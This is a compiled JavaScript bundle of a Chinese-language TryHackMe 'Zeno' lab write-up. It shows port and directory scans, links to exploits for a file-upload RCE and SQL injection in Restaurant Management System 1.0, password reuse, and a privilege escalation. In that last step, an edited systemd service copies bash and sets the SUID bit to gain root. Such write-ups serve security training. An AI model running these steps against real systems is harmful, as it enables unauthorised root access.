"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[246],{47127:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>l});var s=t(74848),r=t(28453);const i={sidebar_position:110,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","services","\u6587\u4ef6\u4e0a\u4f20","SUDO"],title:"Zeno",description:"Zeno",sidebar_label:"Zeno",slug:"/tryhackme/110"},a="Zeno",o={id:"box/TryHackMe/110",title:"Zeno",description:"Zeno",source:"@site/docs/box/TryHackMe/110.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/110",permalink:"/docs/tryhackme/110",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"services",permalink:"/docs/tags/services"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:110,frontMatter:{sidebar_position:110,tags:["Easy","Linux","\u4fe1\u606f\u6cc4\u9732","services","\u6587\u4ef6\u4e0a\u4f20","SUDO"],title:"Zeno",description:"Zeno",sidebar_label:"Zeno",slug:"/tryhackme/110"},sidebar:"boxSidebar",previous:{title:"CMSpit",permalink:"/docs/tryhackme/109"},next:{title:"battery",permalink:"/docs/tryhackme/111"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"12340",id:"12340",level:3},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"apache",id:"apache",level:3},{value:"apache \u2014&gt; edward",id:"apache--edward",level:3},{value:"edward \u2014&gt; root",id:"edward--root",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"zeno",children:"Zeno"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-175-241:~/zeno# nmap -sTCV -p 22,12340 --min-rate 1000 10.10.31.87\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-23 01:50 BST\nNmap scan report for ip-10-10-31-87.eu-west-1.compute.internal (10.10.31.87)\nHost is up (0.00019s latency).\n\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)\n|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)\n|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (EdDSA)\n12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16\n|_http-title: We&#39;ve got some trouble | 404 - Resource not found\nMAC Address: 02:17:43:A8:8B:CF (Unknown)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.96 seconds\n"})}),"\n",(0,s.jsx)(n.h3,{id:"12340",children:"12340"}),"\n",(0,s.jsx)(n.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-175-241:~/zeno# gobuster dir -uhttp://10.10.31.87:12340/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.31.87:12340/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/23 01:57:00 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/rms (Status: 301)\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u53d1\u73b0\u7684 rms \u9875\u9762\u6211\u53d1\u73b0\u5176\u662f\u4e00\u4e2a\u7ba1\u7406\u7cfb\u7edf, \u6240\u4ee5\u6211\u5c31\u67e5\u627e\u6709\u6ca1\u6709\u76f8\u5173\u7684\u6f0f\u6d1e:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/47520",children:"Restaurant Management System 1.0 - Remote Code Execution"})," : \u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e, \u53ef\u4ee5\u5229\u7528"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.a,{href:"https://packetstormsecurity.com/files/171776/Restaurant-Management-System-1.0-SQL-Injection.html",children:"Restaurant Management System 1.0 SQL Injection"})," : SQLi"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132932.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.p,{children:"\u5229\u7528\u4e0a\u9762\u53d1\u73b0\u4e24\u4e2a exp\u6211\u5206\u522b\u8fdb\u884c\u4e86\u64cd\u4f5c:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"sqli : \u8bfb\u53d6\u6570\u636e\u5e93\u7684\u7528\u6237\u8868\u4f46\u662f\u4ec0\u4e48\u90fd\u6ca1\u6709\u83b7\u53d6\u5230"}),"\n",(0,s.jsx)(n.li,{children:"\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u5229\u7528\u6b64\u6765\u83b7\u53d6 Shell"}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"apache",children:"apache"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132932-1.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.h3,{id:"apache--edward",children:"apache \u2014> edward"}),"\n",(0,s.jsx)(n.p,{children:"\u83b7\u53d6\u5230 Shell \u4e4b\u540e\u6211\u8fdb\u884c\u4e86\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u67e5\u770b\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6  \u6570\u636e\u5e93\u5176\u4ed6\u8868\u4e2d\u5185\u5bb9"}),"\n",(0,s.jsx)(n.li,{children:"\u67e5\u770b\u5c5e\u4e8e\u7528\u6237 edward \u7684\u6587\u4ef6,"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4f46\u662f\u90fd\u5931\u8d25\u4e86, \u6211\u4e0a\u4f20\u4e86 ",(0,s.jsx)(n.a,{href:"http://linpeas.sh",children:"linpeas.sh"})," \u6587\u4ef6\u8fdb\u884c\u679a\u4e3e,\u5728\u5176\u4e2d\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a\u4e4b\u5904"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132932-2.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u8fb9\u6cc4\u9732\u4e86\u4e00\u4e2a\u5bc6\u7801\u540c\u65f6\u544a\u8bc9\u6211\u4eec\u4e00\u4e2a\u53ef\u5199\u7684service \u6587\u4ef6, \u6211\u4eec\u4e0d\u59a8\u8003\u8651\u5bc6\u7801\u91cd\u7528\u7684\u95ee\u9898"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-132932-3.png",alt:"Untitled"})}),"\n",(0,s.jsx)(n.h3,{id:"edward--root",children:"edward \u2014> root"}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u53d1\u73b0\u7528\u6237 edward \u5177\u6709\u91cd\u542f\u8ba1\u7b97\u673a\u7684\u7279\u6743, \u6240\u4ee5\u6211\u4eec\u4e0d\u59a8\u4fee\u6539\u4e00\u4e0b\u4e0a\u9762\u53d1\u73b0\u7684 service \u6587\u4ef6\u8fdb\u884c\u5229\u7528"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service\n[Unit]\nDescription=Zeno monitoring\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c "cp /bin/bash /home/edward/bash;chmod u+s /home/edward/bash"\n\n[Install]\nWantedBy=multi-user.target\n[edward@zeno ~]$ ls -al\ntotal 964\ndrwxr-xr-x. 3 root root      139 Sep 23 04:08 .\ndrwxr-xr-x. 3 root root       20 Jul 26  2021 ..\n-rwsr-xr-x. 1 root root   964536 Sep 23 04:08 bash\n'})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>o});var s=t(96540);const r={},i=s.createContext(r);function a(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);